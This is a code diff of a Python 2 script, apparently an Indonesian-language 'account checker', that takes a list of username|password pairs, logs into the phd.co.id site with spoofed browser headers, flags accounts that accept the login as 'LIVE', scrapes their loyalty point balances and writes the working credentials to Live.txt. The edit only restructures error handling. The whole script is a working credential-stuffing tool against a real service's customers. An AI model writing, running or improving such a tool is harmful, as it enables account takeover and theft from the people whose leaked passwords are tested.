@@ -32,7 +32,6 @@ def banner():
                    
 def main():
 	live = []
-	error = []
 	
 	os.system('clear')
 	print(C+'Subscribe YT'+W+' Gua Dlu Su !'+C+' :V')
@@ -42,65 +41,66 @@ def main():
 	banner()
 	print
 	print
-	empas = raw_input(''+C+'Masukkan File'+W+' ('+H+' Ex :'+C+' Empas.txt'+W+') : ')
-	print
-	print(''+C+'-------------- '+W+'Starting'+C+' --------------')
-	print
-	a = open(empas).readlines()
-	
-	for x in a:
+	try:
+		empas = raw_input(''+C+'Masukkan File'+W+' ('+H+' Ex :'+C+' Empas.txt'+W+') : ')
+		print
+		print(''+C+'-------------- '+W+'Starting'+C+' --------------')
+		print
+		a = open(empas).readlines()
 		
-		br = Browser()
-		cokie = cookielib.LWPCookieJar()
-		br.set_handle_equiv(True)
-		br.set_handle_gzip(True)
-		br.set_handle_redirect(True)
-		br.set_handle_referer(True)
-		br.set_handle_robots(False)
-		br.set_cookiejar(cokie)
-		
-		br.addheaders = [
-		("Origin", "https://www.phd.co.id"),
-		("User-Agent", "Mozilla/5.0 (Linux; Android 5.1.1; AFTT Build/LVY48F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/49.0.2623.10"),
-		("Referer", "https://www.phd.co.id/en/users/login/1"),
-		("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
-		]
-		
-		us = x.strip().split('|')[0]
-		ps = x.strip().split('|')[1]
-		
-		url = 'https://www.phd.co.id/en/users/login/1'
-		
-		br.open(url)
-		br.select_form(nr=0)
-		br.form['username']=str(us)
-		br.form['password']=str(ps)
-		
-		a = live
-		b = error
-		
-		if br.submit().geturl() == 'https://www.phd.co.id/en/users/welcome':
+		for x in a:
 			
-			x = br.open('https://www.phd.co.id/en/accounts').read()
-			y = Bs(x,'html.parser')
-			z = y.find('li', {'class' : 'owner-poin'}).text
+			br = Browser()
+			cokie = cookielib.LWPCookieJar()
+			br.set_handle_equiv(True)
+			br.set_handle_gzip(True)
+			br.set_handle_redirect(True)
+			br.set_handle_referer(True)
+			br.set_handle_robots(False)
+			br.set_cookiejar(cokie)
 			
-			print(''+H+'['+W+'LIVE'+H+'] '+W+'USER : '+C+str(us)+W+' | '+W+'PASS : '+C+str(ps)+W+' POIN : '+str(z[6:]))
-			a.append('[ LIVE ] [ USER : '+str(us)+' | PASS : '+str(ps)+' ] [ POIN : '+str(z[6:])+' ] Checked On https://github.com/Fukur0-3XP/Phd')
+			br.addheaders = [
+			
+			("Origin", "https://www.phd.co.id"),
+			("User-Agent", "Mozilla/5.0 (Linux; Android 5.1.1; AFTT Build/LVY48F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/49.0.2623.10"),
+			("Referer", "https://www.phd.co.id/en/users/login/1"),
+			("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
+			
+			]
+			
+			us = x.strip().split('|')[0]
+			ps = x.strip().split('|')[1]
+			
+			url = 'https://www.phd.co.id/en/users/login/1'
+			
+			br.open(url)
+			br.select_form(nr=0)
+			br.form['username']=str(us)
+			br.form['password']=str(ps)
+			
+			a = live
+			
+			if br.submit().geturl() == 'https://www.phd.co.id/en/users/welcome':
+				x = br.open('https://www.phd.co.id/en/accounts').read()
+				y = Bs(x,'html.parser')
+				z = y.find('li', {'class' : 'owner-poin'}).text
+				
+				print(''+H+'['+W+'LIVE'+H+'] '+W+'USER : '+C+str(us)+W+' | '+W+'PASS : '+C+str(ps)+W+' POIN : '+str(z[6:]))
+				a.append('[ LIVE ] [ USER : '+str(us)+' | PASS : '+str(ps)+' ] [ POIN : '+str(z[6:])+' ] Checked On https://github.com/Fukur0-3XP/Phd')
+			
+			else:
+				print(''+A+'['+W+'ERROR'+A+'] '+W+'USER : '+C+str(us)+W+' | '+W+'PASS : '+C+str(ps))
 		
-		else:
-			print(''+A+'['+W+'ERROR'+A+'] '+W+'USER : '+C+str(us)+W+' | '+W+'PASS : '+C+str(ps))
-	
-	c = ('\n'.join(live))
-	d = open('Live.txt','w')
-	d.write(c)
-	print
-	print(''+C+'----------- '+W+'Selesai & Hasil'+C+' -----------')
-	print
-	print(W+'Hasil Live : '+C+str(len(live)))
-	print(W+'Hasil Tersimpan Di File "'+C+'Live.txt'+W+'"') 
-	print
-	d.close()
+		b = ('\n'.join(live))
+		c = open('Live.txt','w')
+		c.write(b)
+		print
+		print(''+C+'----------- '+W+'Selesai & Hasil'+C+' -----------')
+		print
+		print(W+'Hasil Live : '+C+str(len(live)))
+		print(W+'Hasil Tersimpan Di File "'+C+'Live.txt'+W+'"') 
+		print
+		d.close()
 	
 if __name__ == '__main__':
 	main()
